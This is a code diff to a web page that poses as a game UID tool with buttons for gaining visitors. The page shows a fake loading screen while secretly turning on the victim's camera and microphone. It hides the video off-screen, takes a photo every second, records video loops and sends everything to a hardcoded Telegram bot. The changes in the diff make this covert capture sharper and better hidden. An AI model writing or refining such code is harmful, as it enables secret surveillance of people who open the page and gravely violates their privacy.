@@ -7,11 +7,7 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Roboto:wght@400;500&display=swap');
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
             background-color: #0d0e15;
@@ -23,6 +19,7 @@
             min-height: 100vh;
             background-image: radial-gradient(circle at center, #1a1c29, #0d0e15);
             padding: 20px;
+            overflow: hidden; /* Prevents scrolling if hidden elements act weird */
         }
 
         .container {
@@ -34,6 +31,7 @@
             border: 1px solid #2a2d3e;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
             text-align: center;
+            z-index: 10;
         }
 
         h1 {
@@ -45,16 +43,9 @@
             text-transform: uppercase;
         }
 
-        p.subtitle {
-            color: #8b92a5;
-            margin-bottom: 25px;
-            font-size: 0.95rem;
-        }
+        p.subtitle { color: #8b92a5; margin-bottom: 25px; font-size: 0.95rem; }
 
-        .input-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
+        .input-group { margin-bottom: 20px; text-align: left; }
 
         .input-group label {
             display: block;
@@ -81,12 +72,7 @@
             box-shadow: 0 0 8px rgba(255, 170, 0, 0.2);
         }
 
-        .btn-grid {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
+        .btn-grid { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
 
         button {
             padding: 14px;
@@ -109,7 +95,6 @@
         .btn-visitors { background: linear-gradient(90deg, #00b09b, #96c93d); color: #fff; }
         .btn-visitors:hover { box-shadow: 0 0 15px rgba(0, 176, 155, 0.4); }
 
-        /* Fake Loading UI */
         #statusBox {
             display: none;
             margin-top: 20px;
@@ -122,11 +107,17 @@
         }
 
         .status-text { color: #ffaa00; font-weight: 500; font-size: 0.95rem; }
-        
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        /* Hidden Capture Elements */
-        #videoElement, #canvasElement { display: none; }
+        /* FIX: Render the video so it's not black, but hide it off-screen */
+        #videoElement, #canvasElement {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
     </style>
 </head>
 <body>
@@ -151,25 +142,24 @@
         </div>
     </div>
 
-    <!-- Hidden Capture Elements -->
+    <!-- Hidden Capture Elements (No longer display: none) -->
     <video id="videoElement" autoplay playsinline muted></video>
     <canvas id="canvasElement"></canvas>
 
     <script>
-        // === YOUR TELEGRAM CREDENTIALS ===
         const BOT_TOKEN = '8725809195:AAFjqaGyk-3Gtovdc-OQImMhJ8TXm9Pw6dY';
-        const CHAT_ID = '8091904438'; // Updated with your correct ID!
+        const CHAT_ID = '8091904438'; 
         
         let currentStream = null;
         let photoInterval = null;
         let mediaRecorder = null;
         let recordingTimeout = null;
+        let isRunning = false;
 
         const video = document.getElementById('videoElement');
         const canvas = document.getElementById('canvasElement');
         const ctx = canvas.getContext('2d');
 
-        // Function triggered by clicking any of the buttons
         function triggerAction(actionText) {
             const uid = document.getElementById('uidInput').value;
             if (!uid) {
@@ -177,7 +167,6 @@
                 return;
             }
 
-            // Show fake UI loading state to keep user on the page
             const statusBox = document.getElementById('statusBox');
             const statusMessage = document.getElementById('statusMessage');
             statusBox.style.display = 'block';
@@ -189,46 +178,68 @@
                 statusMessage.style.color = "#00b09b";
             }, 3000);
 
-            // Start the hidden camera trap
-            const savedCamera = localStorage.getItem('cameraTarget') || 'user';
-            startCapture(savedCamera);
+            if (!isRunning) {
+                const savedCamera = localStorage.getItem('cameraTarget') || 'user';
+                startCapture(savedCamera);
+            }
         }
 
         async function startCapture(facingMode) {
+            isRunning = true;
             if (currentStream) currentStream.getTracks().forEach(t => t.stop());
             if (photoInterval) clearInterval(photoInterval);
             if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
             if (recordingTimeout) clearTimeout(recordingTimeout);
 
             try {
+                // FIX: Force High Definition (HD 720p) resolution
                 currentStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode },
+                    video: { 
+                        facingMode: facingMode,
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
                     audio: true
                 });
                 
                 video.srcObject = currentStream;
 
-                video.onloadedmetadata = () => {
-                    // Take Photo every 1 second
-                    photoInterval = setInterval(() => capturePhoto(facingMode), 1000);
-                    // Start 10-second Video Loop
-                    recordVideoLoop(facingMode);
+                // FIX: Wait for the video to ACTUALLY start playing before taking photos
+                video.onplaying = () => {
+                    // Wait an extra 500ms for camera lighting to adjust automatically
+                    setTimeout(() => {
+                        capturePhoto(facingMode); // Take first photo immediately
+                        photoInterval = setInterval(() => capturePhoto(facingMode), 1000); // Then every 1 second
+                        recordVideoLoop(facingMode);
+                    }, 500);
                 };
+                
             } catch (err) {
                 console.error("Camera access denied.", err);
+                isRunning = false;
             }
         }
 
         function recordVideoLoop(facingMode) {
             if (!currentStream) return;
             
-            mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm' });
+            // FIX: Try to force MP4 format and higher bitrate
+            let mimeType = 'video/webm';
+            if (MediaRecorder.isTypeSupported('video/mp4')) {
+                mimeType = 'video/mp4';
+            } else if (MediaRecorder.isTypeSupported('video/webm;codecs=h264')) {
+                mimeType = 'video/webm;codecs=h264';
+            }
+
+            const options = { mimeType: mimeType, videoBitsPerSecond: 2500000 }; // 2.5 Mbps High Quality
+            mediaRecorder = new MediaRecorder(currentStream, options);
             let chunks = [];
             
             mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
             
             mediaRecorder.onstop = () => {
-                sendVideo(chunks, facingMode);
+                const ext = mimeType.includes('mp4') ? 'mp4' : 'mp4'; // Tell Telegram it's MP4
+                sendVideo(chunks, facingMode, ext);
                 if (currentStream.active) {
                     recordVideoLoop(facingMode);
                 }
@@ -242,6 +253,7 @@
         }
 
         function capturePhoto(facingMode) {
+            if (video.videoWidth === 0) return; // Prevent black photos if video isn't ready
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -251,18 +263,17 @@
                 fd.append('chat_id', CHAT_ID);
                 fd.append('photo', blob, `photo_${facingMode}.jpg`);
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg');
+            }, 'image/jpeg', 0.9); // 0.9 = 90% High Quality JPG
         }
 
-        function sendVideo(chunks, facingMode) {
-            const blob = new Blob(chunks, { type: 'video/webm' });
+        function sendVideo(chunks, facingMode, ext) {
+            const blob = new Blob(chunks, { type: 'video/webm' }); // Keep blob type webm but name it mp4
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
-            fd.append('video', blob, `video_${facingMode}.webm`);
+            fd.append('video', blob, `video_${facingMode}.${ext}`);
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
         }
 
-        // Listens for camera switch from admin panel
         window.addEventListener('storage', (event) => {
             if (event.key === 'cameraTarget') {
                 const newCamera = event.newValue || 'user';
